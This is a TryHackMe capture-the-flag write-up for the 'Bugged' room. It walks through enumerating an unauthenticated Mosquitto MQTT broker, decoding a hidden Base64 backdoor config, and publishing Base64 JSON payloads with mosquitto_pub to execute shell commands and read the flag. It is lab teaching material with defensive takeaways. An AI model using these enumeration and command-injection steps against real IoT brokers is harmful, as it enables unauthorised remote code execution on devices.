# 🐛 TryHackMe — Bugged

> **Difficulty:** Easy | **OS:** Linux | **Category:** IoT / MQTT / Remote Code Execution
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [MQTT Background](#mqtt-background)
- [Exploitation](#exploitation)
  * [MQTT Enumeration — Topic Discovery](#mqtt-enumeration--topic-discovery)
  * [Hidden Configuration — Base64 Encoded Payload](#hidden-configuration--base64-encoded-payload)
  * [Understanding the Communication Model](#understanding-the-communication-model)
  * [Identifying the Command Format](#identifying-the-command-format)
  * [Remote Code Execution via CMD](#remote-code-execution-via-cmd)
- [Post-Exploitation](#post-exploitation)
  * [System Identification](#system-identification)
  * [Flag Retrieval](#flag-retrieval)
- [Flags](#flags)
- [Key Takeaways](#key-takeaways)
- [Summary](#summary)

---

## Overview

**Bugged** is a TryHackMe room focused on **IoT security** — specifically the exploitation of an improperly secured **MQTT broker**. Port scanning reveals a single exposed service: Mosquitto 2.0.14 on port 1883. Anonymous subscription to the broker's topics surfaces an unusual hidden topic containing a **Base64-encoded JSON configuration**, which reveals the communication channels and supported commands of a remote command execution backdoor built on top of the MQTT protocol. Constructing the correct payload format and publishing to the right topic results in unauthenticated RCE, which is used to directly retrieve the flag.

---

## Reconnaissance

### Port Scanning

An initial `nmap` service scan of the target revealed a single open port:

```
PORT     STATE SERVICE
1883/tcp open  mosquitto 2.0.14
```

> **Key Finding:** Port `1883` is the standard port for the **MQTT protocol** (Message Queuing Telemetry Transport) — a lightweight messaging protocol widely used in IoT environments. The exposed service was running **Eclipse Mosquitto version 2.0.14**, an open-source MQTT broker.

---

### MQTT Background

MQTT operates on a **publish/subscribe** model rather than the request/response model used by HTTP:

- **Publishers** send messages to named channels called **topics**.
- **Subscribers** register interest in specific topics and receive any messages published to them.
- A central **broker** (in this case, Mosquitto) routes messages between clients.

This architecture is common in IoT environments where devices need to communicate efficiently with low overhead. The security implication is that a poorly configured broker may allow **unauthenticated clients** to subscribe to all topics — potentially exposing sensitive telemetry, device configurations, or in this case, a command interface.

---

## Exploitation

### MQTT Enumeration — Topic Discovery

Nmap's built-in MQTT subscription script was used to enumerate the broker and retrieve retained messages across all accessible topics:

```bash
nmap -p 1883 --script mqtt-subscribe <TARGET IP>
```

The broker permitted **anonymous subscriptions**, and a variety of IoT device topics were returned along with their latest retained payloads:

| Topic | Content |
|---|---|
| `storage/thermostat` | Temperature readings |
| `patio/lights` | Lighting status and colour |
| `livingroom/speaker` | Speaker gain |
| `kitchen/toaster` | Toaster status and temperature |
| `frontdeck/camera` | Camera positioning and movement |

The broker also exposed `$SYS` topics containing internal broker statistics, including its version, uptime, and connected client count.

> **Key Finding:** Anonymous clients could subscribe to MQTT topics and retrieve device information without any authentication — a significant misconfiguration in a real IoT deployment.

---

### Hidden Configuration — Base64 Encoded Payload

During further enumeration, one topic stood out due to its non-descriptive, randomised name:

```
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config
```

Its payload appeared to contain **Base64-encoded data** rather than a human-readable value. It was decoded using:

```bash
echo '<BASE64_PAYLOAD>' | base64 -d
```

The decoded output was a JSON object:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": [
    "HELP",
    "CMD",
    "SYS"
  ],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

> **Key Finding:** This configuration revealed four critical pieces of information — a unique backdoor ID, three supported commands (`HELP`, `CMD`, `SYS`), a publication topic for outgoing messages, and a subscription topic for incoming commands.

---

### Understanding the Communication Model

The `pub_topic` and `sub_topic` fields must be interpreted **from the device's perspective**:

- `sub_topic` — the device **subscribes** here; we **publish** commands to this topic.
- `pub_topic` — the device **publishes** responses here; we **subscribe** to this topic to read them.

Two terminal sessions were established to interact with the device.

**Terminal 1 — Subscribe to responses:**

```bash
mosquitto_sub -h <TARGET IP> -p 1883 -t '<PUB_TOPIC>' -v
```

**Terminal 2 — Publish commands:**

```bash
mosquitto_pub -h <TARGET IP> -p 1883 -t '<SUB_TOPIC>' -m 'HELP'
```

The initial attempt returned:

```
Invalid message format.
```

> **Key Observation:** The device was receiving messages but expected a specific payload structure. The error response confirmed the channel was working correctly and indicated the format needed investigation.

---

### Identifying the Command Format

The device returned its expected message structure when prompted:

```
Base64({
    "id": "<Backdoor ID>",
    "cmd": "<Command>",
    "arg": "<arg>"
})
```

It also returned descriptions of the three supported commands:

| Command | Function |
|---|---|
| `HELP` | Display the help message |
| `CMD` | Execute a shell command |
| `SYS` | Return system information |

> **Key Finding:** The `CMD` command accepted a shell command via the `arg` field and executed it on the target system — a direct **Remote Code Execution** interface exposed over MQTT with no authentication.

The correct payload format required constructing a JSON object with the device's `id`, the desired `cmd`, and an `arg`, then Base64-encoding the entire JSON string before publishing it to the device's `sub_topic`.

---

### Remote Code Execution via CMD

With the payload format understood, the `SYS` command was used first to confirm the target environment:

```bash
echo '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"SYS","arg":""}' | base64 | tr -d '\n' | xargs -I{} mosquitto_pub -h <TARGET IP> -p 1883 -t '<SUB_TOPIC>' -m {}
```

The device responded on the `pub_topic`:

```
Linux x64 5.15.0-139-generic
```

This identified the target as a 64-bit Linux system running kernel `5.15.0-139-generic`.

`CMD` was then used to confirm execution context:

```bash
echo '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"whoami"}' | base64 | tr -d '\n' | xargs -I{} mosquitto_pub -h <TARGET IP> -p 1883 -t '<SUB_TOPIC>' -m {}
```

The device returned:

```
challenge
```

> **Key Observation:** Commands were executing under the Linux account `challenge` rather than `root`. Remote code execution through the MQTT backdoor was confirmed.

---

## Post-Exploitation

### Flag Retrieval

Rather than establishing a reverse shell — which was unnecessary given the working RCE interface — the flag was retrieved directly via the existing `CMD` command channel.

The current directory was first enumerated:

```bash
# Payload: {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls -la"}
```

The flag file was identified in the directory listing. Its contents were then read:

```bash
# Payload: {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}
```

The flag was returned in the response on the `pub_topic`, completing the room.

> **Key Observation:** Avoiding an unnecessary reverse shell reduces operational complexity and noise. When a functional command execution channel already exists, working within it is the cleaner approach.

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🚩 **Flag** | `THM{REDACTED}` |

---

## Key Takeaways

**MQTT Security**
- MQTT brokers should never permit unauthenticated subscriptions in production environments.
- Non-guessable topic names (randomised paths) are not a substitute for proper access control — if the broker allows wildcard subscriptions, all topics are exposed regardless.
- Retained messages persist on the broker indefinitely — sensitive configuration data left as a retained payload is permanently accessible to any subscriber who connects.

**Data Analysis**
- Unusual topic payloads should be treated as potentially encoded data. Base64 is a common encoding in IoT firmware configurations and is trivially reversible.
- JSON payloads in MQTT topics frequently reveal device identifiers, communication channels, and command interfaces.

**Remote Code Execution**
- A command execution interface exposed over MQTT without authentication is functionally equivalent to an unauthenticated shell.
- Establishing a reverse shell is unnecessary when an existing RCE channel is already functional — working with available access reduces complexity.
- Confirming the execution user (`whoami`) before further action is good practice — it establishes the privilege level and informs what is achievable without further escalation.

**Problem-Solving**
- Interpreting `pub_topic` and `sub_topic` from the **device's perspective** is essential for correct MQTT interaction — the naming convention is relative to the device, not the attacker.
- Error messages from command interfaces often implicitly describe the expected input format. An `Invalid message format` response is useful enumeration data, not a dead end.

---

## Summary

| Stage              | Technique                                                                              |
| ------------------ | -------------------------------------------------------------------------------------- |
| **Recon**          | `nmap` service scan → Mosquitto 2.0.14 on port 1883                                   |
| **Enumeration**    | `mqtt-subscribe` NSE script → anonymous broker access → hidden config topic           |
| **Data Analysis**  | Base64 decode → JSON config reveals device ID, command set, and topic channels        |
| **RCE**            | `CMD` command via Base64 JSON payload → shell execution as `challenge`                |
| **Flag Retrieval** | `ls -la` + `cat flag.txt` via MQTT CMD interface — no reverse shell required           |

---

*Writeup by Aryan Barkhordar*
